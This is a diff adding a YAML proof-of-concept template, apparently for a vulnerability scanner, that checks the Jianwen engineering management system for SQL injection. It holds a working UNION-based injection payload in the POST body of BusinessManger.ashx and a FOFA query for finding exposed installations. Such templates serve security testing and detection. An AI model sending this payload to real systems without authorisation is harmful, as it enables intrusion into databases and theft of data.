@@ -1,0 +1,20 @@
+id: poc-yaml-justwin-businessmangere-sqli
+info:
+  name: 建文工程管理系统 businessMangere SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 建文工程管理系统
+  fofa: body="Login/QRLogin.ashx"
+variables:
+  t1: random_int(100,999)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /AppInterface/Business/BusinessManger.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: method=PrjType&content=%' and 1=2 union select 1,(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{.t1}}')),3,32));--
+    a
+  expression: "status_code == 200 && \ncontains(body,t2)\n"
+transport: http
